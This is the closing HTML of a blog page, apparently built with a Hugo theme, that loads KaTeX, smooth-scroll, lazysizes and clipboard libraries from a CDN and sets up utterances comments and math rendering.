</div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/copy-tex.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/copy-tex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:10},comment:{utterances:{darkTheme:"github-dark",issueTerm:"pathname",label:"",lightTheme:"github-light",repo:"Mrsdwang/Mrsdwang.github.io"}},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1}}</script><script type=text/javascript src=/js/theme.min.js></script></body>
</html>